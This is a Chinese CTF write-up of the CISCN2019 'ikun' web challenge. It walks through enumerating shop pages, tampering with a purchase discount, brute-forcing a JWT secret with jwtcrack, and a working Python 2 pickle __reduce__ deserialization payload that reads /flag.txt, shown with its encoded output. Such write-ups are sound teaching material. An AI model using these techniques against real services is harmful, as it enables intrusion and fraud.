---
title: CISCN2019华北赛区DayWeb2-ikun
date: 2025-04-02 17:20:50
tags:
- python反序列化
- jwt密钥爆破
- pickle
category:
- 刷题笔记
---

# CISCN2019华北赛区DayWeb2-ikun

首先提示我们要找到lv6

![](../image/CISCN2019华北赛区DayWeb2-ikun-1.png)

一页一页翻肯定是不可能的，可以写一个脚本，因为LV等级都是有参数的在网页源码里

```
import requests
for i in range(1,1000):
    payload="http://node4.anna.nssctf.cn:28150/shop?page=%d"%(i)
    res=requests.get(payload)
    if "lv6.png" in res.content.decode('utf-8'):
     print(i)
     break
```

---

发现在181页

然后购买（需要先注册账户），然后发现买不起只有1000。

这里抓个包看看，把折扣改以下改成0.0000001

这里应该是成功了，但是显示只有admin才能访问

![](../image/CISCN2019华北赛区DayWeb2-ikun-2.png)

在抓包的地方发现jwt，这里很容易就能想到是jwt加解密

在线网站解码[jwt加解密网站](https://jwt.io/)

![](../image/CISCN2019华北赛区DayWeb2-ikun-3.png)

改成admin尝试登录，发现还是不行，500，服务错误，应该是jwt的密钥不对，导致正常的回显页面没出来

用解密工具：c-jwt-cracker试着爆破一下

```
c-jwt-cracker - ( https://github.com/brendan-rius/c-jwt-cracker)
C-jwt-cracker 是暴力破解 JWT 的私钥的工具。此外，它使用了 JWT 的实现，c-jwt-cracker 使用的 Base64库被证明是错误的，并且提供了无效的结果。
```

```
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR0In0.aT0YBJFCjWrVH5uwibrji_0NLf_1SHX3sfnBz14jmKE
```

爆破出来密钥是1Kun

在加解密工具里把密钥输进去，然后再修改用户admin

再抓包修改jwt，发现成功访问，然后点点击成为大会员发现没反应，/b1g_m4mber页面发现了源码压缩包

接下来python代码审计

```
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
关键句是 p = pickle.loads(urllib.unquote(become)
```

这里用的是 pickle.loads函数

 又看到是python2解释器

python2和python3的print是不一样的，python2中print是语句，但是在python3中print是函数

python2中的print "" 输出加不加括号都可以

而 python3中的print(）必须要加括号


```
1）pickle.dump(obj, file, [,protocol])
    函数的功能：将obj对象序列化存入已经打开的file中。
   参数讲解：
obj：想要序列化的obj对象。file:文件名称。
protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
（2）pickle.load(file)
    函数的功能：将file中的对象序列化读出。    参数讲解：
file：文件名称。
（3）pickle.dumps(obj[, protocol])
   函数的功能：将obj对象序列化为string形式，而不是存入文件中。
   参数讲解：
obj：想要序列化的obj对象。
protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。
（4）pickle.loads(string)
   函数的功能：从string中读出序列化前的obj对象。
   参数讲解：
string：文件名称。
```

那我们的目的明显是读取flag文件，然后利用res输出内容。

dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码

```
# -*- coding: utf-8 -*-
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print(a)


在kali中执行该脚本
python2 1.py
```

输出

```
c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A. 
```

抓包添加到隐藏的post传参become后。

拿到flag





